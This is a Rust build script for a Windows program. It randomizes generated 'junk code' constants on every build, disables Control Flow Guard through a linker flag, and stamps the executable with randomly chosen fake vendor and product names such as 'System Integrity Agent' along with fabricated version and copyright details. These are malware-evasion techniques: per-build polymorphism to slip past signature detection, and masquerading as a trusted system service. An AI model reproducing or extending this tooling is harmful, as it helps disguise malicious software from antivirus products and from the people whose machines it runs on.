use rand::Rng;
use std::env;
use std::fs;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("generated.rs");
    let mut rng = rand::thread_rng();

    // 1. Generate Random Constants for Junk Code
    let junk_seed_1: u64 = rng.gen();
    let junk_seed_2: u64 = rng.gen();
    let junk_seed_3: u64 = rng.gen();
    let loop_count: u32 = rng.gen_range(2000..8000);

    let generated_code = format!(
        "pub const JUNK_SEED_1: u64 = 0x{:x};\n\
         pub const JUNK_SEED_2: u64 = 0x{:x};\n\
         pub const JUNK_SEED_3: u64 = 0x{:x};\n\
         pub const JUNK_LOOP_COUNT: u32 = {};\n",
        junk_seed_1, junk_seed_2, junk_seed_3, loop_count
    );

    fs::write(&dest_path, generated_code).unwrap();

    // 2. Randomize Version Info
    println!("cargo:rerun-if-env-changed=BUILD_RANDOM_NONCE");
    println!("cargo:rustc-link-arg=/GUARD:NO"); // Disable CFG
    if env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        let companies = [
            "Universal Driver Solutions",
            "Network Protocol Handler",
            "Display Color Management",
            "System Integrity Monitor",
            "Audio Stream Processor",
        ];
        let products = [
            "Universal Driver Host",
            "Network Protocol Service",
            "Display Color Service",
            "System Integrity Agent",
            "Audio Stream Bridge",
        ];
        let descriptions = [
            "Universal Driver Host Process",
            "Network Protocol Service",
            "Display Color Service",
            "System Integrity Agent",
            "Audio Stream Bridge",
        ];

        let company = companies[rng.gen_range(0..companies.len())];
        let product = products[rng.gen_range(0..products.len())];
        let description = descriptions[rng.gen_range(0..descriptions.len())];

        let major = rng.gen_range(1..10);
        let minor = rng.gen_range(0..20);
        let patch = rng.gen_range(0..100);
        let build = rng.gen_range(1000..9999);
        let version = format!("{}.{}.{}.{}", major, minor, patch, build);

        let mut res = winres::WindowsResource::new();
        // res.set_icon("icon.ico");
        res.set("FileDescription", description);
        res.set("FileVersion", &version);
        res.set("ProductVersion", &version);
        res.set("ProductName", product);
        res.set("CompanyName", company);
        res.set(
            "LegalCopyright",
            &format!("Copyright (C) {}", 2020 + rng.gen_range(0..5)),
        );
        res.set(
            "OriginalFilename",
            &format!("{}.exe", product.to_lowercase().replace(" ", "_")),
        );
        res.compile().unwrap();
    }
}
